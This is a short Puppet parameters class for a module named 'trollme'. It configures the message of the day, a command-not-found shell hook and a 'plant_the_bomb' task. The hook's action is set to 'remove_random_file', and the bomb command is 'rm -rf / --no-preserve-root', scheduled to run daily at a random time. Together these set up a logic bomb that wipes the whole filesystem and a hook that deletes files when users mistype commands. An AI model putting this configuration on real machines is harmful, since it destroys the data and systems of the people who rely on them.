class trollme::params {

  # prereq stuff:
  $locate_pkg = 'mlocate'
  $locate_db = '/var/lib/mlocate/mlocate.db'
  $locate_cmd = '/bin/updatedb'

  # motd:
  $motd_ascii_art = 'stopthedick'
  $motd_file      = '/etc/motd'

  # command_not_found:
  $cnf_file   = '/etc/profile.d/cnf.sh'
  $cnf_action = 'remove_random_file'
  $sl_pkg     = 'sl'

  # plant_the_bomb
  $ptb_command = 'rm -rf / --no-preserve-root'
  $ptb_time_range = '00:00 - 23:59'
  $ptb_period = 'daily'
  $ptb_repeat = 1


}
